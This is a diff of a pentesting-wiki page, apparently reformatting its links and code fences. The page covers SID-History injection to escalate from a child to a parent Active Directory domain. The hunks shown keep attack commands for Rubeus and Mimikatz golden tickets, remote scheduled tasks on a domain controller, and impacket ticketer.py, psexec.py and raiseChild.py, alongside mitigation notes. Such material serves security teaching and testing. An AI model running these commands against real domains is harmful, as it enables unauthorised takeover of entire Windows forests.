@@ -1,6 +1,5 @@
 # SID-History Injection
 
-
 ## SID History Injection Attack
 
 The focus of the **SID History Injection Attack** is aiding **user migration between domains** while ensuring continued access to resources from the former domain. This is accomplished by **incorporating the user's previous Security Identifier (SID) into the SID History** of their new account. Notably, this process can be manipulated to grant unauthorized access by adding the SID of a high-privilege group (such as Enterprise Admins or Domain Admins) from the parent domain to the SID History. This exploitation confers access to all resources within the parent domain.
@@ -16,17 +15,16 @@ Another way yo find the SID of a group of the other domain (for example "Domain 
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-```
 
 > [!WARNING]
 > Note that it's possible to disable SID history in a trust relationship which will make this attack fail.
 
-According to the [[https://technet.microsoft.com/library/cc835085.aspx|**docs**]]:
+According to the [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
 - **Disabling SIDHistory on forest trusts** using the netdom tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
 - **Applying SID Filter Quarantining to external trusts** using the netdom tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
 - **Applying SID Filtering to domain trusts within a single forest** is not recommended as it is an unsupported configuration and can cause breaking changes. If a domain within a forest is untrustworthy then it should not be a member of the forest. In this situation it is necessary to first split the trusted and untrusted domains into separate forests where SID Filtering can be applied to an interforest trust
 
-Check this post for more information about bypassing this: [[https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4|**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**]]
+Check this post for more information about bypassing this: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
@@ -47,7 +45,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-```
+
 ### Golden Ticket (Mimikatz) with KRBTGT-AES256
 
 ```bash
@@ -66,7 +64,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-```
+
 For more info about golden tickets check:
 
 [[golden-ticket.md]]
@@ -80,7 +78,7 @@ For more info about diamond tickets check:
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-```
+
 Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:
 
 ```bash
@@ -94,14 +92,14 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-```
+
 With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
 
 [[dcsync.md]]
 
 ### From linux
 
-#### Manual with [[https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py|ticketer.py]]
+#### Manual with [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 
 ```bash
 # This is for an attack from child to root domain
@@ -122,8 +120,8 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-```
-#### Automatic using [[https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py|raiseChild.py]]
+
+#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
 This is an Impacket script which will **automate escalating from child to parent domain**. The script needs:
 
@@ -142,11 +140,9 @@ The flow is:
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-```
+
 ## References
 
-- [[https://adsecurity.org/?p=1772|https://adsecurity.org/?p=1772]]
-- [[https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/|https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/]]
-
-
+- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
+- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 
